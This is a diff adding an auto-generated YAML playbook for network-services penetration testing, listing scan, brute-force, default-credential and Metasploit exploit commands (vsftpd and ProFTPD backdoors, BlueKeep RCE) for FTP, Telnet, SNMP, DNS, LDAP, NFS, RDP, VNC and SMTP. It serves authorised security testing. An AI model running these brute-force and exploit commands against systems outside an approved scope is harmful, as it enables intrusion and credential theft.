@@ -1,0 +1,529 @@
+# GENERATED from network_services.md by scripts/playbooks_to_yaml.py — do not hand-edit.
+#
+# The markdown stays authoritative: it is what a human reads and what RAG
+# ingests. This is an EXTRACT of the steps in it, so that something other
+# than a language model can act on them. Re-generate after editing the
+# markdown; tests/test_playbooks.py fails if the two drift.
+#
+# access_required is a conservative heuristic, recorded so a consumer can
+# FILTER — never so anything can decide to run. Authorisation stays with
+# the scope gate and the engagement's approval.
+name: network_services
+title: Network Services Penetration Testing Methodology
+source: network_services.md
+generated_by: scripts/playbooks_to_yaml.py
+phases:
+- id: ftp-port-21
+  name: FTP (Port 21)
+  steps:
+  - id: ftp-port-21.reconnaissance
+    title: Reconnaissance
+    access_required: none
+    mutates: false
+    source_line: 10
+    commands:
+    - lang: bash
+      command: nmap -sV -sC -p21 --script=ftp-* {target}
+    - lang: bash
+      command: nc {target} 21
+  - id: ftp-port-21.authentication-testing
+    title: Authentication Testing
+    access_required: none
+    mutates: false
+    source_line: 19
+  - id: ftp-port-21.anonymous-access
+    title: Anonymous Access
+    access_required: none
+    mutates: false
+    source_line: 21
+    commands:
+    - lang: bash
+      command: ftp {target}
+  - id: ftp-port-21.default-credentials
+    title: Default Credentials
+    access_required: none
+    mutates: false
+    source_line: 28
+    checks:
+    - anonymous:(empty or email)
+    - ftp:ftp
+    - admin:admin
+    - user:user
+  - id: ftp-port-21.brute-force
+    title: Brute Force
+    access_required: credential
+    mutates: false
+    source_line: 34
+    commands:
+    - lang: bash
+      command: hydra -L users.txt -P passwords.txt ftp://{target}
+    - lang: bash
+      command: medusa -h {target} -U users.txt -P passwords.txt -M ftp
+  - id: ftp-port-21.exploitation
+    title: Exploitation
+    access_required: none
+    mutates: false
+    source_line: 40
+  - id: ftp-port-21.vsftpd-2-3-4-backdoor
+    title: vsftpd 2.3.4 Backdoor
+    access_required: none
+    mutates: true
+    source_line: 42
+    commands:
+    - lang: bash
+      command: use exploit/unix/ftp/vsftpd_234_backdoor
+    - lang: bash
+      command: set RHOSTS {target}
+    - lang: bash
+      command: exploit
+  - id: ftp-port-21.proftpd-backdoor
+    title: ProFTPD Backdoor
+    access_required: none
+    mutates: true
+    source_line: 50
+    commands:
+    - lang: bash
+      command: use exploit/unix/ftp/proftpd_133c_backdoor
+  - id: ftp-port-21.post-access
+    title: Post-Access
+    access_required: shell
+    mutates: true
+    source_line: 55
+    commands:
+    - lang: bash
+      command: ls -la
+    - lang: bash
+      command: wget -r ftp://anonymous:@{target}/
+    - lang: bash
+      command: put test.txt
+  - id: ftp-port-21.metasploit-modules
+    title: Metasploit Modules
+    access_required: none
+    mutates: false
+    source_line: 67
+    commands:
+    - lang: bash
+      command: use auxiliary/scanner/ftp/ftp_version
+    - lang: bash
+      command: use auxiliary/scanner/ftp/ftp_login
+    - lang: bash
+      command: use auxiliary/scanner/ftp/anonymous
+- id: telnet-port-23
+  name: Telnet (Port 23)
+  steps:
+  - id: telnet-port-23.reconnaissance
+    title: Reconnaissance
+    access_required: none
+    mutates: false
+    source_line: 78
+    commands:
+    - lang: bash
+      command: nmap -sV -sC -p23 --script=telnet-* {target}
+  - id: telnet-port-23.authentication-testing
+    title: Authentication Testing
+    access_required: credential
+    mutates: false
+    source_line: 83
+    commands:
+    - lang: bash
+      command: telnet {target}
+    - lang: bash
+      command: hydra -L users.txt -P passwords.txt telnet://{target}
+  - id: telnet-port-23.default-credentials
+    title: Default Credentials
+    access_required: none
+    mutates: false
+    source_line: 92
+    checks:
+    - admin:admin
+    - root:root
+    - user:user
+    - (varies by device manufacturer)
+  - id: telnet-port-23.metasploit-modules
+    title: Metasploit Modules
+    access_required: none
+    mutates: false
+    source_line: 98
+    commands:
+    - lang: bash
+      command: use auxiliary/scanner/telnet/telnet_version
+    - lang: bash
+      command: use auxiliary/scanner/telnet/telnet_login
+- id: snmp-port-161-162-udp
+  name: SNMP (Port 161/162 UDP)
+  steps:
+  - id: snmp-port-161-162-udp.reconnaissance
+    title: Reconnaissance
+    access_required: none
+    mutates: false
+    source_line: 108
+    commands:
+    - lang: bash
+      command: nmap -sU -sV -p161 --script=snmp-* {target}
+    - lang: bash
+      command: onesixtyone -c community.txt {target}
+  - id: snmp-port-161-162-udp.community-string-brute-force
+    title: Community String Brute Force
+    access_required: none
+    mutates: false
+    source_line: 117
+    commands:
+    - lang: bash
+      command: onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt {target}
+  - id: snmp-port-161-162-udp.common-community-strings
+    title: Common Community Strings
+    access_required: none
+    mutates: false
+    source_line: 122
+    checks:
+    - public
+    - private
+    - manager
+    - cisco
+    - community
+  - id: snmp-port-161-162-udp.information-gathering
+    title: Information Gathering
+    access_required: none
+    mutates: false
+    source_line: 129
+    commands:
+    - lang: bash
+      command: snmpwalk -v2c -c public {target}
+    - lang: bash
+      command: snmpwalk -v2c -c public {target} system
+    - lang: bash
+      command: snmpwalk -v2c -c public {target} interfaces
+    - lang: bash
+      command: snmpwalk -v2c -c public {target} hrSWRunName
+    - lang: bash
+      command: snmpwalk -v2c -c public {target} hrSWInstalledName
+    - lang: bash
+      command: snmpwalk -v2c -c public {target} 1.3.6.1.4.1.77.1.2.25
+    - lang: bash
+      command: snmp-check {target}
+  - id: snmp-port-161-162-udp.metasploit-modules
+    title: Metasploit Modules
+    access_required: none
+    mutates: false
+    source_line: 153
+    commands:
+    - lang: bash
+      command: use auxiliary/scanner/snmp/snmp_enum
+    - lang: bash
+      command: use auxiliary/scanner/snmp/snmp_login
+    - lang: bash
+      command: use auxiliary/scanner/snmp/snmp_enumusers
+    - lang: bash
+      command: use auxiliary/scanner/snmp/snmp_enumshares
+- id: dns-port-53
+  name: DNS (Port 53)
+  steps:
+  - id: dns-port-53.reconnaissance
+    title: Reconnaissance
+    access_required: none
+    mutates: false
+    source_line: 165
+    commands:
+    - lang: bash
+      command: nmap -sV -sC -p53 --script=dns-* {target}
+    - lang: bash
+      command: nmap -sU -sV -p53 --script=dns-* {target}
+  - id: dns-port-53.zone-transfer
+    title: Zone Transfer
+    access_required: none
+    mutates: false
+    source_line: 171
+    commands:
+    - lang: bash
+      command: dig @{target} {domain} AXFR
+    - lang: bash
+      command: host -l {domain} {target}
+    - lang: bash
+      command: dnsrecon -d {domain} -n {target} -t axfr
+  - id: dns-port-53.subdomain-enumeration
+    title: Subdomain Enumeration
+    access_required: none
+    mutates: false
+    source_line: 183
+    commands:
+    - lang: bash
+      command: dnsrecon -d {domain} -n {target} -t brt -D subdomains.txt
+    - lang: bash
+      command: dnsenum --dnsserver {target} {domain}
+    - lang: bash
+      command: fierce --domain {domain} --dns-servers {target}
+  - id: dns-port-53.cache-snooping
+    title: Cache Snooping
+    access_required: none
+    mutates: false
+    source_line: 195
+    commands:
+    - lang: bash
+      command: dig @{target} www.google.com +norecurse
+  - id: dns-port-53.metasploit-modules
+    title: Metasploit Modules
+    access_required: none
+    mutates: false
+    source_line: 201
+    commands:
+    - lang: bash
+      command: use auxiliary/gather/dns_bruteforce
+    - lang: bash
+      command: use auxiliary/gather/dns_info
+    - lang: bash
+      command: use auxiliary/scanner/dns/dns_amp
+- id: ldap-port-389-636
+  name: LDAP (Port 389/636)
+  steps:
+  - id: ldap-port-389-636.reconnaissance
+    title: Reconnaissance
+    access_required: none
+    mutates: false
+    source_line: 212
+    commands:
+    - lang: bash
+      command: nmap -sV -sC -p389,636 --script=ldap-* {target}
+  - id: ldap-port-389-636.anonymous-bind
+    title: Anonymous Bind
+    access_required: none
+    mutates: false
+    source_line: 217
+    commands:
+    - lang: bash
+      command: ldapsearch -x -H ldap://{target} -b "dc=example,dc=com"
+  - id: ldap-port-389-636.information-gathering
+    title: Information Gathering
+    access_required: none
+    mutates: false
+    source_line: 223
+    commands:
+    - lang: bash
+      command: ldapsearch -x -H ldap://{target} -s base namingcontexts
+    - lang: bash
+      command: ldapsearch -x -H ldap://{target} -b "dc=example,dc=com" "(objectClass=user)"
+    - lang: bash
+      command: ldapsearch -x -H ldap://{target} -b "dc=example,dc=com" "*"
+  - id: ldap-port-389-636.domain-dump
+    title: Domain Dump
+    access_required: credential
+    mutates: false
+    source_line: 235
+    commands:
+    - lang: bash
+      command: ldapdomaindump -u 'domain\user' -p 'password' {target}
+  - id: ldap-port-389-636.metasploit-modules
+    title: Metasploit Modules
+    access_required: none
+    mutates: false
+    source_line: 241
+    commands:
+    - lang: bash
+      command: use auxiliary/gather/ldap_query
+    - lang: bash
+      command: use auxiliary/scanner/ldap/ldap_search
+- id: nfs-port-2049-111
+  name: NFS (Port 2049/111)
+  steps:
+  - id: nfs-port-2049-111.reconnaissance
+    title: Reconnaissance
+    access_required: none
+    mutates: false
+    source_line: 251
+    commands:
+    - lang: bash
+      command: nmap -sV -sC -p111,2049 --script=nfs-* {target}
+  - id: nfs-port-2049-111.export-enumeration
+    title: Export Enumeration
+    access_required: credential
+    mutates: false
+    source_line: 256
+    commands:
+    - lang: bash
+      command: showmount -e {target}
+    - lang: bash
+      command: rpcinfo -p {target}
+  - id: nfs-port-2049-111.mounting-shares
+    title: Mounting Shares
+    access_required: none
+    mutates: true
+    source_line: 265
+    commands:
+    - lang: bash
+      command: mkdir /mnt/nfs
+    - lang: bash
+      command: mount -t nfs {target}:/share /mnt/nfs
+    - lang: bash
+      command: mount -t nfs -o vers=2 {target}:/share /mnt/nfs
+    - lang: bash
+      command: ls -la /mnt/nfs
+  - id: nfs-port-2049-111.common-vulnerabilities
+    title: Common Vulnerabilities
+    access_required: none
+    mutates: false
+    source_line: 278
+    checks:
+    - World-readable exports
+    - no_root_squash (root on client = root on server)
+    - Writable shares
+  - id: nfs-port-2049-111.metasploit-modules
+    title: Metasploit Modules
+    access_required: none
+    mutates: false
+    source_line: 283
+    commands:
+    - lang: bash
+      command: use auxiliary/scanner/nfs/nfsmount
+- id: rdp-port-3389
+  name: RDP (Port 3389)
+  steps:
+  - id: rdp-port-3389.reconnaissance
+    title: Reconnaissance
+    access_required: none
+    mutates: false
+    source_line: 292
+    commands:
+    - lang: bash
+      command: nmap -sV -sC -p3389 --script=rdp-* {target}
+  - id: rdp-port-3389.authentication-testing
+    title: Authentication Testing
+    access_required: none
+    mutates: false
+    source_line: 297
+    commands:
+    - lang: bash
+      command: xfreerdp /v:{target} /u:administrator
+    - lang: bash
+      command: rdesktop {target}
+  - id: rdp-port-3389.brute-force
+    title: Brute Force
+    access_required: credential
+    mutates: false
+    source_line: 306
+    commands:
+    - lang: bash
+      command: hydra -L users.txt -P passwords.txt rdp://{target}
+    - lang: bash
+      command: crowbar -b rdp -s {target}/32 -u admin -C passwords.txt
+    - lang: bash
+      command: ncrack -vv --user administrator -P passwords.txt rdp://{target}
+  - id: rdp-port-3389.vulnerability-checking
+    title: Vulnerability Checking
+    access_required: none
+    mutates: false
+    source_line: 318
+  - id: rdp-port-3389.bluekeep-cve-2019-0708
+    title: BlueKeep (CVE-2019-0708)
+    access_required: none
+    mutates: false
+    source_line: 320
+    commands:
+    - lang: bash
+      command: nmap -p3389 --script rdp-vuln-ms12-020 {target}
+    - lang: bash
+      command: use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
+    - lang: bash
+      command: set RHOSTS {target}
+    - lang: bash
+      command: run
+  - id: rdp-port-3389.metasploit-modules
+    title: Metasploit Modules
+    access_required: none
+    mutates: false
+    source_line: 331
+    commands:
+    - lang: bash
+      command: use auxiliary/scanner/rdp/rdp_scanner
+    - lang: bash
+      command: use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
+    - lang: bash
+      command: use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+- id: vnc-port-5900
+  name: VNC (Port 5900+)
+  steps:
+  - id: vnc-port-5900.reconnaissance
+    title: Reconnaissance
+    access_required: none
+    mutates: false
+    source_line: 342
+    commands:
+    - lang: bash
+      command: nmap -sV -sC -p5900-5910 --script=vnc-* {target}
+  - id: vnc-port-5900.authentication-testing
+    title: Authentication Testing
+    access_required: credential
+    mutates: false
+    source_line: 347
+    commands:
+    - lang: bash
+      command: vncviewer {target}:5900
+    - lang: bash
+      command: hydra -P passwords.txt vnc://{target}
+  - id: vnc-port-5900.no-authentication
+    title: No Authentication
+    access_required: none
+    mutates: false
+    source_line: 356
+    commands:
+    - lang: bash
+      command: nmap -p5900 --script vnc-info {target}
+  - id: vnc-port-5900.metasploit-modules
+    title: Metasploit Modules
+    access_required: none
+    mutates: false
+    source_line: 362
+    commands:
+    - lang: bash
+      command: use auxiliary/scanner/vnc/vnc_none_auth
+    - lang: bash
+      command: use auxiliary/scanner/vnc/vnc_login
+- id: smtp-port-25-465-587
+  name: SMTP (Port 25/465/587)
+  steps:
+  - id: smtp-port-25-465-587.reconnaissance
+    title: Reconnaissance
+    access_required: none
+    mutates: false
+    source_line: 372
+    commands:
+    - lang: bash
+      command: nmap -sV -sC -p25,465,587 --script=smtp-* {target}
+  - id: smtp-port-25-465-587.user-enumeration
+    title: User Enumeration
+    access_required: credential
+    mutates: false
+    source_line: 377
+    commands:
+    - lang: bash
+      command: smtp-user-enum -M VRFY -U users.txt -t {target}
+    - lang: bash
+      command: smtp-user-enum -M RCPT -U users.txt -t {target}
+    - lang: bash
+      command: smtp-user-enum -M EXPN -U users.txt -t {target}
+  - id: smtp-port-25-465-587.open-relay-check
+    title: Open Relay Check
+    access_required: none
+    mutates: true
+    source_line: 389
+    commands:
+    - lang: bash
+      command: telnet {target} 25
+    - lang: bash
+      command: HELO attacker.com
+    - lang: bash
+      command: MAIL FROM:<test@attacker.com>
+    - lang: bash
+      command: RCPT TO:<victim@external.com>
+    - lang: bash
+      command: nmap -p25 --script smtp-open-relay {target}
+  - id: smtp-port-25-465-587.metasploit-modules
+    title: Metasploit Modules
+    access_required: none
+    mutates: false
+    source_line: 401
+    commands:
+    - lang: bash
+      command: use auxiliary/scanner/smtp/smtp_version
+    - lang: bash
+      command: use auxiliary/scanner/smtp/smtp_enum
+    - lang: bash
+      command: use auxiliary/scanner/smtp/smtp_relay
